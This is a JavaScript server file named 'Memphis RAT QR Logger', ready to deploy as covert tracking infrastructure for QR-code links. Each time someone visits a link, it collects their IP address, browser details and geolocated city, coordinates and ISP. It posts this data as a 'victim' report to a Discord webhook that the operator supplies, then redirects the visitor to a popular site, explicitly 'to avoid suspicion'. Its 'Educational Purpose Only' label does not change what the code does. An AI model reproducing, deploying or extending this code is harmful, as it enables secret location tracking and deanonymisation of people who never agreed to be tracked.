// Memphis RAT - QR Logger Webhook Handler
// Deploy this to webrat.vercel.app

const express = require('express');
const cors = require('cors');
const { createHash } = require('crypto');

const app = express();
app.use(cors());
app.use(express.json());

// Store active sessions
const sessions = new Map();

// Register new tracking session
app.post('/api/register', (req, res) => {
  const { session_id, computer_name, discord_webhook, channel_id, message, target_info } = req.body;
  
  sessions.set(session_id, {
    computer_name,
    discord_webhook,
    channel_id,
    message,
    target_info,
    created_at: new Date(),
    victims: []
  });
  
  console.log(`Registered session: ${session_id} for ${computer_name}`);
  res.json({ success: true, session_id });
});

// Handle QR code visits
app.get('/track/:session_id', async (req, res) => {
  const { session_id } = req.params;
  const session = sessions.get(session_id);
  
  if (!session) {
    return res.status(404).send('Session not found');
  }
  
  // Collect visitor information
  const visitor_info = {
    ip: req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress,
    user_agent: req.headers['user-agent'],
    referer: req.headers['referer'] || 'Direct',
    accept_language: req.headers['accept-language'],
    accept_encoding: req.headers['accept-encoding'],
    timestamp: new Date().toISOString(),
    session_id
  };
  
  // Get additional IP information
  try {
    const ipResponse = await fetch(`http://ip-api.com/json/${visitor_info.ip}`);
    const ipData = await ipResponse.json();
    
    if (ipData.status === 'success') {
      visitor_info.location = {
        country: ipData.country,
        region: ipData.regionName,
        city: ipData.city,
        zip: ipData.zip,
        lat: ipData.lat,
        lon: ipData.lon,
        timezone: ipData.timezone,
        isp: ipData.isp,
        org: ipData.org,
        as: ipData.as
      };
    }
  } catch (error) {
    console.error('Error fetching IP info:', error);
  }
  
  // Add to session victims
  session.victims.push(visitor_info);
  
  // Send to Discord webhook
  try {
    const locationStr = visitor_info.location ? 
      `${visitor_info.location.city}, ${visitor_info.location.region}, ${visitor_info.location.country}` : 
      'Unknown';
    
    const discordPayload = {
      embeds: [{
        title: '🎯 QR Code Victim Tracked',
        description: `New victim accessed QR code from **${session.computer_name}**`,
        color: 0xff0000,
        fields: [
          { name: '🌐 IP Address', value: visitor_info.ip, inline: true },
          { name: '📍 Location', value: locationStr, inline: true },
          { name: '📱 User Agent', value: visitor_info.user_agent.substring(0, 100), inline: false },
          { name: '🔗 Referer', value: visitor_info.referer, inline: true },
          { name: '🗣️ Language', value: visitor_info.accept_language?.split(',')[0] || 'Unknown', inline: true },
          { name: '📄 Session ID', value: session_id, inline: true },
          { name: '💬 Message', value: session.message, inline: true },
          { name: '⏰ Timestamp', value: visitor_info.timestamp, inline: true }
        ],
        footer: { text: 'Educational Purpose Only - Memphis RAT' },
        thumbnail: { url: 'https://cdn.discordapp.com/emojis/769665110096543796.png' }
      }]
    };
    
    // Add location details if available
    if (visitor_info.location) {
      discordPayload.embeds[0].fields.push({
        name: '🏢 ISP Information',
        value: `**ISP:** ${visitor_info.location.isp}\n**Org:** ${visitor_info.location.org}\n**AS:** ${visitor_info.location.as}`,
        inline: false
      });
      
      discordPayload.embeds[0].fields.push({
        name: '📍 Coordinates',
        value: `**Lat:** ${visitor_info.location.lat}\n**Lon:** ${visitor_info.location.lon}\n**Timezone:** ${visitor_info.location.timezone}`,
        inline: true
      });
    }
    
    await fetch(session.discord_webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordPayload)
    });
    
    console.log(`Sent victim data to Discord for session ${session_id}`);
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
  
  // Redirect to a legitimate looking page to avoid suspicion
  const redirectOptions = [
    'https://github.com/trending',
    'https://stackoverflow.com',
    'https://reddit.com',
    'https://news.ycombinator.com',
    'https://youtube.com'
  ];
  
  const randomRedirect = redirectOptions[Math.floor(Math.random() * redirectOptions.length)];
  res.redirect(randomRedirect);
});

// Get session stats
app.get('/api/sessions/:session_id', (req, res) => {
  const session = sessions.get(req.params.session_id);
  if (!session) {
    return res.status(404).json({ error: 'Session not found' });
  }
  res.json(session);
});

// List all sessions (admin endpoint)
app.get('/api/admin/sessions', (req, res) => {
  const sessionList = Array.from(sessions.entries()).map(([id, data]) => ({
    session_id: id,
    computer_name: data.computer_name,
    created_at: data.created_at,
    victim_count: data.victims.length,
    message: data.message
  }));
  
  res.json({
    total_sessions: sessions.size,
    sessions: sessionList
  });
});

// Health check
app.get('/', (req, res) => {
  res.json({ 
    status: 'Memphis RAT QR Logger Active',
    version: '2.0.0',
    sessions: sessions.size,
    timestamp: new Date().toISOString(),
    endpoints: {
      register: 'POST /api/register',
      track: 'GET /track/:session_id',
      stats: 'GET /api/sessions/:session_id',
      admin: 'GET /api/admin/sessions'
    }
  });
});

// Cleanup old sessions (runs every hour)
setInterval(() => {
  const now = new Date();
  const maxAge = 24 * 60 * 60 * 1000; // 24 hours
  
  let cleaned = 0;
  for (const [session_id, session_data] of sessions.entries()) {
    if (now - new Date(session_data.created_at) > maxAge) {
      sessions.delete(session_id);
      cleaned++;
    }
  }
  
  if (cleaned > 0) {
    console.log(`Cleaned up ${cleaned} old sessions`);
  }
}, 60 * 60 * 1000); // Run every hour

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Memphis RAT QR Logger running on port ${PORT}`);
  console.log(`Active sessions: ${sessions.size}`);
});

module.exports = app;
